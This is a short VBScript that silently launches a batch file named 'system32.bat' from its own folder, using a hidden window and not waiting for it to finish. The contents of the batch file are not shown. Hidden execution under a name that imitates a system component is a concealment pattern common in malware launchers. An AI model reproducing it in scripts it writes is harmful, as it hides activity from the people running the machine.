Set WshShell = CreateObject("WScript.Shell")
Dim klasor
klasor = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)
WshShell.Run """" & klasor & "\system32.bat""", 0, False
Set WshShell = Nothing